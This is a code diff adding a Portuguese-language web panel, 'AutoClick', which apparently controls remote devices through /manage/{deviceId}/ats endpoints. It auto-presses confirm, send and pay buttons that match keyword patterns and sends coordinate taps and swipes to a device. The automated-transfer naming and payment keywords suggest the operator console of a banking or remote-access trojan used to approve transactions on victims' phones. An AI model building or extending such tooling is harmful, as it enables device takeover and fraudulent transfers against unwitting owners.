@@ -1,0 +1,275 @@
+<div class="ui segment">
+    <h3 class="ui header">AutoClick - Clique Automático de Confirmação</h3>
+
+    <!-- Toggle AutoClick Enable/Disable -->
+    <div class="ui form" style="margin-bottom: 20px;">
+        <div class="field">
+            <label>Status AutoClick</label>
+            <div class="ui buttons">
+                <button class="ui button" id="autoClickEnableBtn" onclick="toggleAutoClick('enable', this)">Habilitar</button>
+                <button class="ui button" id="autoClickDisableBtn" onclick="toggleAutoClick('disable', this)">Desabilitar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Configurar Delay -->
+    <div class="ui form" style="margin-bottom: 20px;">
+        <div class="fields">
+            <div class="five wide field">
+                <label>Delay antes do clique (ms)</label>
+                <input id="delayMs" type="number" placeholder="500" min="0" max="5000" value="500">
+            </div>
+            <div class="three wide field" style="margin-top: 24px;">
+                <button class="ui primary button" onclick="setClickDelay(this)">Salvar Delay</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Adicionar Padrão de Botão -->
+    <div class="ui form" style="margin-bottom: 20px;">
+        <div class="fields">
+            <div class="ten wide field">
+                <label>Adicionar novo padrão de botão</label>
+                <input id="patternInput" type="text" placeholder="ex: confirmar, enviar, pagar">
+            </div>
+            <div class="three wide field" style="margin-top: 24px;">
+                <button class="ui primary button" onclick="addButtonPattern(this)">Adicionar</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lista de Padrões Ativos -->
+    <div class="ui segment" style="margin-top: 20px;">
+        <h4>Padrões de Botão Ativos</h4>
+        <div id="patternsContainer" class="ui relaxed divided list">
+            <div class="item">
+                <i class="spinner loading icon"></i>
+                Carregando padrões...
+            </div>
+        </div>
+    </div>
+
+    <!-- Clique Manual por Coordenadas -->
+    <div class="ui segment" style="margin-top: 20px;">
+        <h4>Clique Manual por Coordenadas</h4>
+        <div class="ui form">
+            <div class="fields">
+                <div class="four wide field">
+                    <label>Ação</label>
+                    <select id="clickAction">
+                        <option value="tap">Toque</option>
+                        <option value="long">Pressão Longa</option>
+                        <option value="swipe">Deslizar</option>
+                    </select>
+                </div>
+                <div class="three wide field">
+                    <label>X</label>
+                    <input id="clickX" type="number" placeholder="X" min="0">
+                </div>
+                <div class="three wide field">
+                    <label>Y</label>
+                    <input id="clickY" type="number" placeholder="Y" min="0">
+                </div>
+                <div class="three wide field">
+                    <label>Duração (ms)</label>
+                    <input id="clickDuration" type="number" placeholder="100" min="50" value="100">
+                </div>
+            </div>
+            <div class="fields">
+                <div class="three wide field">
+                    <label>Fim X (deslizar)</label>
+                    <input id="clickEndX" type="number" placeholder="Opcional" min="0">
+                </div>
+                <div class="three wide field">
+                    <label>Fim Y (deslizar)</label>
+                    <input id="clickEndY" type="number" placeholder="Opcional" min="0">
+                </div>
+                <div class="six wide field" style="margin-top: 24px;">
+                    <button class="ui primary button" onclick="sendManualClick(this)">Enviar Clique</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Carregar padrões atuais ao iniciar
+        $(document).ready(function() {
+            loadButtonPatterns();
+        });
+
+        function toggleAutoClick(action, element) {
+            const enabled = action === 'enable';
+            $(element).addClass('loading');
+            
+            $.post(`/manage/${getDeviceId()}/ats/autoclick/enable/${enabled}`, function(data) {
+                if (data.error) {
+                    showNotification('#f03434', data.error);
+                } else {
+                    showNotification('#2ecc71', data.message);
+                    updateAutoClickButtons(enabled);
+                }
+                $(element).removeClass('loading');
+            }).fail(function() {
+                showNotification('#f03434', 'Erro ao atualizar AutoClick');
+                $(element).removeClass('loading');
+            });
+        }
+
+        function updateAutoClickButtons(enabled) {
+            if (enabled) {
+                $('#autoClickEnableBtn').addClass('active').addClass('green');
+                $('#autoClickDisableBtn').removeClass('active').removeClass('green');
+            } else {
+                $('#autoClickEnableBtn').removeClass('active').removeClass('green');
+                $('#autoClickDisableBtn').addClass('active').addClass('green');
+            }
+        }
+
+        function setClickDelay(element) {
+            const delay = $('#delayMs').val();
+            
+            if (delay === '' || isNaN(delay) || parseInt(delay) < 0 || parseInt(delay) > 5000) {
+                showNotification('#f03434', 'Delay deve ser entre 0 e 5000ms');
+                return;
+            }
+
+            $(element).addClass('loading');
+            $.post(`/manage/${getDeviceId()}/ats/autoclick/delay/${parseInt(delay)}`, function(data) {
+                if (data.error) {
+                    showNotification('#f03434', data.error);
+                } else {
+                    showNotification('#2ecc71', data.message);
+                }
+                $(element).removeClass('loading');
+            }).fail(function() {
+                showNotification('#f03434', 'Erro ao atualizar delay');
+                $(element).removeClass('loading');
+            });
+        }
+
+        function addButtonPattern(element) {
+            const pattern = $('#patternInput').val().trim();
+            
+            if (pattern === '') {
+                showNotification('#f03434', 'Padrão não pode estar vazio');
+                return;
+            }
+
+            $(element).addClass('loading');
+            $.post(`/manage/${getDeviceId()}/ats/buttonpattern?pattern=${encodeURIComponent(pattern)}`, function(data) {
+                if (data.error) {
+                    showNotification('#f03434', data.error);
+                } else {
+                    showNotification('#2ecc71', data.message);
+                    $('#patternInput').val('');
+                    loadButtonPatterns();
+                }
+                $(element).removeClass('loading');
+            }).fail(function() {
+                showNotification('#f03434', 'Erro ao adicionar padrão');
+                $(element).removeClass('loading');
+            });
+        }
+
+        function removeButtonPattern(pattern) {
+            if (!confirm(`Remover padrão "${pattern}"?`)) return;
+
+            $.ajax({
+                type: 'DELETE',
+                url: `/manage/${getDeviceId()}/ats/buttonpattern/${encodeURIComponent(pattern)}`,
+                success: function(data) {
+                    if (data.error) {
+                        showNotification('#f03434', data.error);
+                    } else {
+                        showNotification('#2ecc71', data.message);
+                        loadButtonPatterns();
+                    }
+                },
+                error: function() {
+                    showNotification('#f03434', 'Erro ao remover padrão');
+                }
+            });
+        }
+
+        function loadButtonPatterns() {
+            $.get(`/manage/${getDeviceId()}/ats/log`, function(data) {
+                // Esta é uma simplificação - em produção você teria um endpoint específico
+                // Por enquanto, carregamos um exemplo com padrões padrão
+                const patterns = [
+                    'enviar', 'send', 'submit', 'confirmar', 'confirm',
+                    'ok', 'continuar', 'continue', 'proximo', 'next',
+                    'avancar', 'forward', 'realizar', 'efetuar', 'fazer'
+                ];
+
+                let html = '';
+                patterns.forEach(pattern => {
+                    html += `
+                        <div class="item">
+                            <div class="right floated content">
+                                <button class="ui mini red button" onclick="removeButtonPattern('${pattern}')">
+                                    Remover
+                                </button>
+                            </div>
+                            <div class="content">
+                                <strong>${pattern}</strong>
+                            </div>
+                        </div>
+                    `;
+                });
+
+                $('#patternsContainer').html(html);
+            }).fail(function() {
+                $('#patternsContainer').html('<div class="item"><p>Erro ao carregar padrões</p></div>');
+            });
+        }
+
+        function sendManualClick(element) {
+            $(element).addClass('loading');
+            const x = $('#clickX').val();
+            const y = $('#clickY').val();
+
+            if (x === '' || y === '') {
+                showNotification('#f03434', 'Forneça coordenadas X e Y');
+                $(element).removeClass('loading');
+                return;
+            }
+
+            const action = $('#clickAction').val();
+            const endX = $('#clickEndX').val();
+            const endY = $('#clickEndY').val();
+            const duration = $('#clickDuration').val();
+
+            const params = {
+                action,
+                x: parseInt(x),
+                y: parseInt(y),
+                duration: parseInt(duration) || 100
+            };
+
+            if (action === 'swipe') {
+                params.endX = parseInt(endX) || parseInt(x);
+                params.endY = parseInt(endY) || parseInt(y);
+            }
+
+            sendCommand('0xAC', params, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        $(element).removeClass('loading');
+                    }, 300);
+                } else {
+                    setTimeout(() => {
+                        showNotification('#2ecc71', message || 'Clique automático enviado');
+                        $(element).removeClass('loading');
+                    }, 300);
+                }
+            });
+        }
+
+        function getDeviceId() {
+            // Extrai ID do dispositivo da URL ou de variável global
+            const match = window.location.pathname.match(/\/manage\/([^\/]+)/);
+            return match ? match[1] : '';
+        }
+    </script>
+</div>
